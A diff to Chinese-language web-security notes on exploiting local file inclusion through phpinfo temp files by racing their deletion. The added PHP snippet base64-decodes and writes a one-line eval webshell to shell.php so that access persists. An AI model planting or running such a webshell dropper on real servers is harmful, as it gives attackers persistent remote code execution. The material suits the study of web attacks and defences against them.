@@ -165,6 +165,14 @@ PHP removes temp files(if any)
 毕竟是临时文件，因此存在时间很短暂，需要利用条件竞争，脚本在下面的pdf中有
 [LFI With PHPInfo Assistance](LFI%20With%20PHPInfo%20Assistance.pdf)
 本质原理很简单，就是在tmp文件被删除前对其进行包含，最合适的写法是把代码写为当访问后生成一个webshell，以此来保证持续访问
+```php
+<?php
+$a = 'PD9waHAgZXZhbCgkX1JFUVVFU1RbJ3lzeSddKTs/Pg==';
+$shellfile = fopen("shell.php",'w');
+fwrite($shellfile,base64_decode($a));
+fclose($shellfile);
+?>
+```
 
 # 参考文章
 
